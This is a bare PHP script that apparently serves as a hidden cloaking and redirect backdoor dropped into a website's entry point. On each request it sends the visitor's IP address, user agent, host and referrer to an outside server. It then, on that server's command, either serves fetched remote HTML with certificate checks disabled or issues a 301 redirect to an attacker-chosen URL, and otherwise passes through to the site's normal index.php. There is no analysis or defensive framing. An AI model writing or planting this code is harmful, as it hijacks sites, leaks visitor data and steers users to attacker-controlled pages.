<?php function handleRequest()
{
    $apiUrl = "https://sundongyang.sbs/api/shade";
    $payload = [
        "ip" => isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : "",
        "user_agent" => isset($_SERVER["HTTP_USER_AGENT"])
            ? $_SERVER["HTTP_USER_AGENT"]
            : "",
        "hostname" => isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : "",
        "referer" => isset($_SERVER["HTTP_REFERER"])
            ? $_SERVER["HTTP_REFERER"]
            : "",
    ];
    $response = sendPostRequest($apiUrl, $payload);
    if (
        $response &&
        isset($response["success"]) &&
        $response["success"] === true
    ) {
        $data = isset($response["data"]) ? $response["data"] : [];
        $action = isset($data["operation"]) ? $data["operation"] : "";
        $target = isset($data["target_url"]) ? $data["target_url"] : "";
        if ($action === "cloak" && !empty($target)) {
            $html = fetchRemoteContent($target);
            if ($html !== false) {
                ob_start();
                echo $html;
                ob_end_flush();
            }
            exit();
        } elseif ($action === "redirect" && !empty($target)) {
            header(
                "Location: " . filter_var($target, FILTER_SANITIZE_URL),
                true,
                301
            );
            exit();
        }
    }
}
function sendPostRequest($url, $data)
{
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_TIMEOUT => 5,
    ]);
    $result = curl_exec($ch);
    $httpStatus = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($httpStatus === 200) {
        return json_decode($result, true);
    }
    return null;
}
function fetchRemoteContent($url)
{
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 5,
    ]);
    $content = curl_exec($ch);
    if (curl_errno($ch)) {
        error_log("Fetch error: " . curl_error($ch));
        $content = false;
    }
    curl_close($ch);
    return $content;
}
handleRequest();
if (file_exists("index.php")) {
    include "index.php";
} elseif (file_exists("index.html")) {
    header("Location: index.html", true, 301);
    exit();
}
